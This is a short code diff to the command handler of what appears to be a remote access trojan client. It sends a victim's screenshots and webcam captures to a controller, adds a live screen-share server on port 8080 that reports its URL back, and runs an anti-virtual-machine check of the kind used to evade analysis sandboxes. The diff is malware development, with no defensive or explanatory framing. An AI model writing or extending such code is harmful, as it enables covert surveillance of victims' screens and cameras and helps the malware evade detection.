@@ -95,18 +95,27 @@ class CLIENT:
             self.send_data(screenshot.get_data(), encode=False)
     
         elif data[0] == "webcam":
+            # print("Executing webcam: " + data[1])
             webcam = WEBCAM()
             self.send_data(webcam.get_data(), encode=False)
 
+
         elif data[0] == "screenshare":
             # print("Executing Screenshare: " + data[1])
-            screenshare = Screenshare()
-            self.send_data(screenshare.get_data(), encode=False)
+            from mods.screenshare import ScreenShareServer
+            port = 8080
+            self.screenshare = ScreenShareServer(port=port)  
+            url = f"http://{self.screenshare.get_local_ip()}:{port}/screenshare"
+            self.send_data(url)
+
         elif data[0] == "antivm":
             # print("Executing Antivm: " + data[1])
-            antivm = AntiVM()
-            self.send_data(antivm.get_data() , encode=False)
+            
+            detected = AntiVM(verbose=False)
+            self.send_data(detected.get_data())
+
         else:
+            # print("Executing Unknown command: " + data[0])
             print(f"[!] Unknown command: {data[0]}")
             self.send_data(f"Unknown command: {data[0]}".encode('utf-8'))
 
